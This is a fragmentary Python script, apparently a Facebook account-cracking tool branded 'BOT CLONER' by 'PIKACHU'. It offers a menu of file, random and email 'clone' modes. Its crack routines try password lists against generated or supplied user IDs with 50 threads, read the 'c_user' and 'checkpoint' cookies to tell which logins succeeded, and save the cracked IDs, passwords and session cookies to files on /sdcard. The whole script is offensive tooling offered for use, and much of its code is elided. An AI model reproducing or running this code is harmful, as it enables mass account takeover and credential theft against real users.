...
try:
	...
	print(' \x1b[1;91m\x1b[1;96m\x1b[1;92m \x1b[1;96m[PIKACHU-XD')
...
\033[1;32m---------------------------------------------------------
\033[1;32m  AUTHOR    : PIKACHU
\033[1;32m  GITHUB    : PIKACHU-217
\033[1;32m  FACEBOOK  : RJ SHANTO
\033[1;32m  TOOL NAME : BOT CLONER
\033[1;32m  TOOL TYPE : PREMIUM  
\033[1;32m  VERSION   : 01
\033[1;32m---------------------------------------------------------
"""  )
...
def menu():
	...
	_PIKACHU_(f'\033[1;92m[\033[1;34m1\033[1;92m] FILE CLONE')
	_PIKACHU_(f'\033[1;92m[\033[1;92m\033[1;34m2\033[1;92m] RANDOM CLONE')
	_PIKACHU_(f'\033[1;92m[\033[1;92m\033[1;34m3\033[1;92m] EMAIL CLONE')
	_PIKACHU_(f'[\033[1;92m\033[1;34m4\033[1;92m] CONTACT ME')
	_PIKACHU_(f'\033[1;92m[\033[1;34m0\033[1;92m]\033[0;91m EXIT')
	_____PIKACHU_____ = input('\033[1;92m[\033[1;34m🙂\033[1;92m]\033[0;92mCHOOSE :\x1b[1;92m ')
	if _____PIKACHU_____ in ['1']:
		C1()
	if _____PIKACHU_____ in ['2']:
		Y2()
	if _____PIKACHU_____ in ['3']:
		BER()
	if _____PIKACHU_____ in ['4']:
		os.system("xdg-open https://www.facebook.com/profile.php?id=100000448332183")
	if _____PIKACHU_____ in ['0']:
		exit()
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{bo} [PIKACHU] {h}[{k}{loop}/{len(id)}{h}] {h}[OK] {h}[{ok}] {h}[{''.format(loop/float(len(id)))}] ")
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r\x1b[1;91m [\033[1;91mPIKACHU-CP\033[1;91m] \033[1;91m '+idf+ ' | '+pw+'')
				#open('/sdcard/'+PIKACHU-file clone,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
				...
				#print ()
				print(f'\r\x1b[1;92m [\033[1;92mPIKACHU-OK\033[1;92m] \033[1;92m '+idf+ ' | '+pw+'')
				#print('\r\x1b[1;96m [\033[1;93mCOOKIES\033[1;96m]\033[1;91m= \033[1;97m '+kuki+'')
				cek_apk(session,coki)
				open('/sdcard/PIKACHU-FILE-CLONE-OK','a').write(idf+'|'+pw+'|'+kuki+'\n')
				akun.append(idf+'|'+pw)
				break
...
def Y2():
    ...
    for nmbr in range(limit):
        ...
        user.append(nmp)
    with ThreadPool(max_workers=50) as PIKACHU:
        clear()
        tl = str(len(user))      
        ...
        for love in user:
            ...
            uid = code+love
            PIKACHU.submit(PIKACHU,uid,pwv,tl)
    ...
    try:
        for ps in pwx:
        	...
        	if 'c_user' in log_cookies:
        	    ...
        	    cid = coki[151:166]
        	    print ('')
        	    print('\033[1;92m[\033[1;92mPIKACHU-XD\033[1;92m] \033[1;92m'+uid+' | '+ps+ '\033[1;91m = \033[1;96m '+tahunng(cid))
        	    print ('\033[1;93m [\033[1;96mCookie \033[1;93m]\033[1;91m = \033[1;92m '+coki+'')
        	    cek_apk(session,coki)
        	    open('/sdcard/PIKACHU-RANDOM.OK.txt', 'a').write( uid+' | '+ps+'\n')
        	    oks.append(uid)
        	    break 
        	elif 'checkpoint' in log_cookies:
        	    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
        	    cid = coki[141:156]
        	    print('\033[1;91m[PIKACHU.CP]\033[1;93m[😪]\033[1;91m'+uid+' | '+ps+'\033[1;94m'+tahunng(uid))
              #  print ('\033[1;32m[‎😔]\033[1;91m = \033[1;34m'+coki+'  \033[0;32m')
                #cek_apk(session,coki)
        	    open('/sdcard/PIKACHU-RANDOM-CP.txt', 'a').write( cid+' | '+ps+' \n')
        	    cps.append(uid)
        	    break          
        	else:
        	    continue
        loop+=1
        sys.stdout.write('\r%s[PIKACHU-XD]\033[1;32m-%s/%s][OK-%s]\033[1;92m[CP-%s] \r'%(bi,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    ...
    try:
        for ps in pwv:
            ...
            if 'c_user' in log_cookies:
        	    ...
        	    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
        	    cid = coki[141:156]
        	    print('\033[1;91m[PIKACHU.CP]\033[1;93m[😪]\033[1;91m'+uid+' | '+ps+'\033[1;91m '+tahunng(uid))
              #  print ('\033[1;32m[😔]\033[1;91m = \033[1;34m'+coki+'  \033[0;32m')
                #cek_apk(session,coki)
        	    open('/sdcard/PIKACHU-RANDOM-CP.txt', 'a').write( cid+' | '+ps+' \n')
        	    cps.append(uid)
